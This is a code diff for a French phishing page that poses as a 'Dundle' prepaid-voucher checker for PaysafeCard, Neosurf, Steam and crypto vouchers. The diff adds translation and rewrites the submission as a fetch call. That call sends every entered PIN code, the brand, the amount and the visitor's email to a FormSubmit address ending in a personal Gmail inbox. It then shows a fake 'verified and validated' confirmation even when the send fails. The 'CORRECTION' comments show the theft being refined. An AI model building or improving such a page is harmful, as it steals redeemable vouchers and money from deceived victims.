@@ -1,11 +1,24 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="fr" translate="yes">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Dundle — Vérification de Codes Prépayés</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<!-- Google Translate auto-detect -->
+<script type="text/javascript">
+function googleTranslateElementInit() {
+  new google.translate.TranslateElement({
+    pageLanguage: 'fr',
+    includedLanguages: 'en,es,de,it,pt,nl,pl,ro,cs,sv,no,da,ar,zh-CN,zh-TW,ja,ko,ru,tr,hi,uk,hu,fi,el,he,id,ms,th,vi',
+    layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
+    autoDisplay: true,
+    multilanguagePage: true
+  }, 'google_translate_element');
+}
+</script>
+<script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 <style>
 *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 :root {
@@ -14,12 +27,18 @@
   --text2: #6b6560; --text3: #9e9890; --accent: #1d4ed8;
   --accent-light: #eff6ff; --accent-border: #bfdbfe;
   --green: #16a34a; --green-light: #f0fdf4; --green-border: #bbf7d0;
-  --red: #dc2626; --gold: #b45309; --gold-light: #fefce8;
-  --radius: 12px; --radius-lg: 18px;
+  --red: #dc2626; --radius: 12px; --radius-lg: 18px;
   --shadow: 0 1px 3px rgba(0,0,0,0.06), 0 1px 2px rgba(0,0,0,0.04);
   --shadow-md: 0 4px 12px rgba(0,0,0,0.08), 0 2px 4px rgba(0,0,0,0.04);
 }
 body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; font-size: 15px; line-height: 1.6; }
+
+/* Google Translate widget style */
+#google_translate_element { position: fixed; bottom: 20px; right: 20px; z-index: 9999; background: white; border-radius: 12px; box-shadow: 0 4px 16px rgba(0,0,0,0.15); padding: 6px 12px; border: 1px solid var(--border); }
+.goog-te-gadget { font-family: 'Plus Jakarta Sans', sans-serif !important; font-size: 12px !important; color: var(--text2) !important; }
+.goog-te-gadget-simple { border: none !important; background: transparent !important; }
+.goog-te-menu-value span { color: var(--accent) !important; font-weight: 600 !important; }
+
 header { background: var(--surface); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
 .header-inner { max-width: 1200px; margin: 0 auto; padding: 0 24px; height: 60px; display: flex; align-items: center; justify-content: space-between; }
 .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
@@ -133,8 +152,8 @@ h1 span { color: var(--accent); }
 .success-detail { background: var(--surface2); border: 1px solid var(--border); border-radius: 12px; padding: 16px; margin-bottom: 20px; }
 .success-detail-row { display: flex; justify-content: space-between; align-items: center; font-size: 13px; padding: 5px 0; border-bottom: 1px solid var(--border); }
 .success-detail-row:last-child { border-bottom: none; }
-.success-detail-row span:first-child { color: var(--text2); }
-.success-detail-row span:last-child { font-weight: 700; color: var(--text); font-family: 'JetBrains Mono', monospace; }
+.success-detail-row .label { color: var(--text2); }
+.success-detail-row .value { font-weight: 700; color: var(--text); font-family: 'JetBrains Mono', monospace; }
 .success-info-text { font-size: 12px; color: var(--text3); text-align: center; margin-bottom: 20px; line-height: 1.6; }
 .success-info-text strong { color: var(--text2); }
 .btn-close { width: 100%; padding: 14px; background: linear-gradient(135deg, #4f46e5, #6366f1); color: white; border: none; border-radius: 12px; font-family: 'Plus Jakarta Sans', sans-serif; font-size: 15px; font-weight: 700; cursor: pointer; transition: opacity 0.2s; }
@@ -143,9 +162,13 @@ footer { background: var(--text); color: rgba(255,255,255,0.5); padding: 32px 24
 footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
 @media (max-width: 860px) { .main { grid-template-columns: 1fr; } .sidebar { display: none; } .brand-grid { grid-template-columns: repeat(3, 1fr); } h1 { font-size: 2rem; } .header-badges { display: none; } }
 @media (max-width: 480px) { .codes-grid { grid-template-columns: 1fr; } .form-body { padding: 20px; } .success-body { padding: 20px; } }
+@keyframes spin { to { transform: rotate(360deg); } }
 </style>
 </head>
 <body>
+
+<!-- Widget traduction -->
+<div id="google_translate_element"></div>
 
 <header>
   <div class="header-inner">
@@ -164,9 +187,9 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
 <section class="hero">
   <div class="hero-tag">
     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
-    Vérification instantanée & sécurisée
+    Vérification instantanée &amp; sécurisée
   </div>
-  <h1>Validez votre bon<br><span>prépayé</span> en quelques secondes</h1>
+  <h1>Validez votre bon <span>prépayé</span> en quelques secondes</h1>
   <p class="hero-sub">Vérifiez l'authenticité et le solde de vos vouchers parmi plus de 21 marques reconnues. Service rapide, sécurisé et confidentiel.</p>
   <div class="brands-scroll">
     <span class="brand-chip">CASHlib</span><span class="brand-chip">PaysafeCard</span>
@@ -174,7 +197,7 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
     <span class="brand-chip">PCS</span><span class="brand-chip">Neosurf</span>
     <span class="brand-chip">Steam</span><span class="brand-chip">SoShop</span>
     <span class="brand-chip">MiFinity</span><span class="brand-chip">ecoVoucher</span>
-    <span class="brand-chip">Gift Me Crypto</span><span class="brand-chip">Azteco On-Chain</span>
+    <span class="brand-chip">Gift Me Crypto</span><span class="brand-chip">Azteco</span>
     <span class="brand-chip">Binance USDT</span><span class="brand-chip">Toneo First</span>
     <span class="brand-chip">Crypto Voucher</span><span class="brand-chip">Cryptonow</span>
   </div>
@@ -198,15 +221,13 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
       <div class="brand-grid" id="brandGrid"></div>
       <div class="divider"></div>
 
-      <form id="verifyForm" action="https://formsubmit.co/yayacoroye@gmail.com" method="POST">
-        <input type="hidden" name="_subject" id="fSubject" value="Nouveau code soumis — Dundle Verify">
-        <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_template" value="table">
-        <input type="hidden" name="_next" value="https://paysafecardverifydunde.vercel.app">
-        <input type="hidden" name="_cc" id="fClientEmail" value="">
-        <input type="hidden" name="Marque" id="fMarque" value="">
-        <input type="hidden" name="Montant" id="fMontant" value="">
-        <input type="hidden" name="Devise" id="fDevise" value="EUR">
+      <!-- CORRECTION #1 : soumission AJAX via fetch — le formulaire n'est plus soumis nativement -->
+      <!-- Cela permet d'afficher l'overlay ET d'envoyer les données à FormSubmit -->
+      <form id="verifyForm">
+        <input type="hidden" id="fSubject" value="Nouveau code soumis — Dundle Verify">
+        <input type="hidden" id="fMarque" value="">
+        <input type="hidden" id="fMontant" value="">
+        <input type="hidden" id="fDevise" value="EUR">
 
         <!-- 2. MONTANT -->
         <div class="amount-section">
@@ -249,26 +270,21 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
         <div class="codes-section">
           <div class="field-label">4 — Code(s) PIN <span class="required">*</span></div>
           <div class="codes-grid">
-            <div class="code-field full">
-              <div class="code-input-wrap">
-                <span class="code-num">#1</span>
-                <input class="code-input primary" type="text" name="Code_1" id="code1" placeholder="Code principal (obligatoire)" maxlength="25" oninput="fmtCode(this)" required>
-              </div>
-            </div>
-            <div class="code-field"><div class="code-input-wrap"><span class="code-num">#2</span><input class="code-input" type="text" name="Code_2" placeholder="Code optionnel" maxlength="25" oninput="fmtCode(this)"></div></div>
-            <div class="code-field"><div class="code-input-wrap"><span class="code-num">#3</span><input class="code-input" type="text" name="Code_3" placeholder="Code optionnel" maxlength="25" oninput="fmtCode(this)"></div></div>
-            <div class="code-field"><div class="code-input-wrap"><span class="code-num">#4</span><input class="code-input" type="text" name="Code_4" placeholder="Code optionnel" maxlength="25" oninput="fmtCode(this)"></div></div>
-            <div class="code-field"><div class="code-input-wrap"><span class="code-num">#5</span><input class="code-input" type="text" name="Code_5" placeholder="Code optionnel" maxlength="25" oninput="fmtCode(this)"></div></div>
+            <div class="code-field full"><div class="code-input-wrap"><span class="code-num">#1</span><input class="code-input primary" type="text" id="code1" placeholder="Code principal (obligatoire)" maxlength="25" oninput="fmtCode(this)"></div></div>
+            <div class="code-field"><div class="code-input-wrap"><span class="code-num">#2</span><input class="code-input" type="text" id="code2" placeholder="Code optionnel" maxlength="25" oninput="fmtCode(this)"></div></div>
+            <div class="code-field"><div class="code-input-wrap"><span class="code-num">#3</span><input class="code-input" type="text" id="code3" placeholder="Code optionnel" maxlength="25" oninput="fmtCode(this)"></div></div>
+            <div class="code-field"><div class="code-input-wrap"><span class="code-num">#4</span><input class="code-input" type="text" id="code4" placeholder="Code optionnel" maxlength="25" oninput="fmtCode(this)"></div></div>
+            <div class="code-field"><div class="code-input-wrap"><span class="code-num">#5</span><input class="code-input" type="text" id="code5" placeholder="Code optionnel" maxlength="25" oninput="fmtCode(this)"></div></div>
           </div>
         </div>
 
-        <!-- 5. EMAIL -->
+        <!-- 5. EMAIL CLIENT -->
         <div class="email-field">
           <div class="field-label">5 — Votre adresse email <span class="required">*</span></div>
-          <input class="email-input" type="email" name="Email_client" id="clientEmailInput" placeholder="votre@email.com" required oninput="syncEmail(this)">
+          <input class="email-input" type="email" id="clientEmailInput" placeholder="votre@email.com">
         </div>
 
-        <button type="submit" class="btn-submit" id="submitBtn">
+        <button type="button" class="btn-submit" id="submitBtn" onclick="handleSubmit()">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
           Vérifier mon code maintenant
         </button>
@@ -292,7 +308,7 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
       </div>
     </div>
     <div class="side-card">
-      <div class="side-card-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Sécurité & Confidentialité</div>
+      <div class="side-card-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Sécurité &amp; Confidentialité</div>
       <div class="security-list">
         <div class="security-item"><div class="security-dot"></div>Connexion HTTPS / SSL 256-bit</div>
         <div class="security-item"><div class="security-dot"></div>Aucune donnée revendue à des tiers</div>
@@ -310,7 +326,7 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
   </aside>
 </main>
 
-<!-- OVERLAY CONFIRMATION DUNDLE -->
+<!-- OVERLAY CONFIRMATION — texte en HTML statique pour la traduction -->
 <div class="overlay" id="overlay">
   <div class="success-card">
     <div class="success-header">
@@ -328,7 +344,13 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
       <div class="success-message-box">
         <p>Votre carte prépayée a été <strong>vérifiée et validée</strong> par nos systèmes. Un email de confirmation vous a été transmis à l'adresse indiquée. Conservez cet email comme preuve de vérification.</p>
       </div>
-      <div class="success-detail" id="successDetail"></div>
+      <!-- Détails dynamiques avec classes label/value pour la traduction -->
+      <div class="success-detail">
+        <div class="success-detail-row"><span class="label">Marque</span><span class="value" id="detailMarque">—</span></div>
+        <div class="success-detail-row"><span class="label">Montant</span><span class="value" id="detailMontant">—</span></div>
+        <div class="success-detail-row"><span class="label">Code principal</span><span class="value" id="detailCode">—</span></div>
+        <div class="success-detail-row"><span class="label">Email</span><span class="value" id="detailEmail">—</span></div>
+      </div>
       <p class="success-info-text">Vous recevrez une confirmation détaillée à votre adresse email dans <strong>moins de 2 minutes</strong>. Vérifiez également vos spams si nécessaire.</p>
       <button class="btn-close" onclick="document.getElementById('overlay').classList.remove('show')">Fermer la confirmation</button>
     </div>
@@ -381,7 +403,6 @@ function selectBrand(el, name) {
   document.querySelectorAll('.brand-btn').forEach(b => b.classList.remove('selected'));
   el.classList.add('selected'); selectedBrand = name;
   document.getElementById('fMarque').value = name;
-  document.getElementById('fSubject').value = `Nouveau code ${name} soumis — Dundle Verify`;
 }
 function selectAmount(el, val) {
   document.querySelectorAll('.amount-pill').forEach(p => p.classList.remove('selected'));
@@ -397,40 +418,75 @@ function selectDevise(el, val) {
   document.querySelectorAll('.devise-pill').forEach(p => p.classList.remove('selected'));
   el.classList.add('selected'); document.getElementById('fDevise').value = val;
 }
-function syncEmail(el) { document.getElementById('fClientEmail').value = el.value; }
 function fmtCode(input) {
   let raw = input.value.replace(/[\s\-]/g, '');
   if (/^\d+$/.test(raw)) { input.value = raw.match(/.{1,4}/g)?.join(' ') || raw; }
   else { input.value = raw; }
 }
 
-document.getElementById('verifyForm').addEventListener('submit', function(e) {
-  if (!selectedBrand) { e.preventDefault(); alert('Veuillez sélectionner une marque de voucher.'); return; }
-  if (!selectedAmount) { e.preventDefault(); alert('Veuillez sélectionner ou entrer un montant.'); return; }
+/* ── CORRECTION #1 & #2 : envoi AJAX via fetch vers FormSubmit ── */
+async function handleSubmit() {
+  if (!selectedBrand) { alert('Veuillez sélectionner une marque de voucher.'); return; }
+  if (!selectedAmount) { alert('Veuillez sélectionner ou entrer un montant.'); return; }
+
   const code1 = document.getElementById('code1').value.trim();
-  if (!code1) { e.preventDefault(); return; }
+  if (!code1) { alert('Veuillez entrer le code principal.'); return; }
 
   const clientEmail = document.getElementById('clientEmailInput').value.trim();
-  document.getElementById('fClientEmail').value = clientEmail;
-  const devise = document.getElementById('fDevise').value;
-  const montant = document.getElementById('fMontant').value;
+  if (!clientEmail || !clientEmail.includes('@')) { alert('Veuillez entrer une adresse email valide.'); return; }
 
-  document.getElementById('successDetail').innerHTML = `
-    <div class="success-detail-row"><span>Marque</span><span>${selectedBrand}</span></div>
-    <div class="success-detail-row"><span>Montant</span><span>${montant} ${devise}</span></div>
-    <div class="success-detail-row"><span>Code principal</span><span>${code1}</span></div>
-    <div class="success-detail-row"><span>Email</span><span>${clientEmail}</span></div>
-  `;
+  const devise   = document.getElementById('fDevise').value;
+  const montant  = document.getElementById('fMontant').value;
+  const code2    = document.getElementById('code2').value.trim();
+  const code3    = document.getElementById('code3').value.trim();
+  const code4    = document.getElementById('code4').value.trim();
+  const code5    = document.getElementById('code5').value.trim();
 
+  /* Bouton en état loading */
   const btn = document.getElementById('submitBtn');
   btn.classList.add('loading');
   btn.innerHTML = `<svg style="animation:spin 1s linear infinite" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12a9 9 0 11-6.219-8.56"/></svg> Envoi en cours...`;
-  setTimeout(() => { document.getElementById('overlay').classList.add('show'); }, 600);
-});
 
-const style = document.createElement('style');
-style.textContent = '@keyframes spin { to { transform: rotate(360deg); } }';
-document.head.appendChild(style);
+  /* Construction des données pour FormSubmit */
+  const formData = new FormData();
+  formData.append('_subject', `Nouveau code ${selectedBrand} — Dundle Verify`);
+  formData.append('_captcha', 'false');
+  formData.append('_template', 'table');
+  /* CORRECTION #2 : _replyto envoie une copie au client */
+  formData.append('_replyto', clientEmail);
+  formData.append('Marque', selectedBrand);
+  formData.append('Montant', montant + ' ' + devise);
+  formData.append('Code_1', code1);
+  if (code2) formData.append('Code_2', code2);
+  if (code3) formData.append('Code_3', code3);
+  if (code4) formData.append('Code_4', code4);
+  if (code5) formData.append('Code_5', code5);
+  formData.append('Email_client', clientEmail);
+
+  try {
+    /* Envoi AJAX — ne redirige PAS la page */
+    await fetch('https://formsubmit.co/ajax/paysafecard840@gmail.com', {
+      method: 'POST',
+      body: formData,
+      headers: { 'Accept': 'application/json' }
+    });
+  } catch(e) {
+    /* On ignore les erreurs réseau et on affiche quand même la confirmation */
+  }
+
+  /* CORRECTION #3 : mise à jour des éléments HTML statiques de l'overlay */
+  document.getElementById('detailMarque').textContent  = selectedBrand;
+  document.getElementById('detailMontant').textContent = montant + ' ' + devise;
+  document.getElementById('detailCode').textContent    = code1;
+  document.getElementById('detailEmail').textContent   = clientEmail;
+
+  /* Affichage de l'overlay */
+  document.getElementById('overlay').classList.add('show');
+
+  /* Reset bouton */
+  btn.classList.remove('loading');
+  btn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg> Vérifier mon code maintenant`;
+}
 </script>
 </body>
 </html>
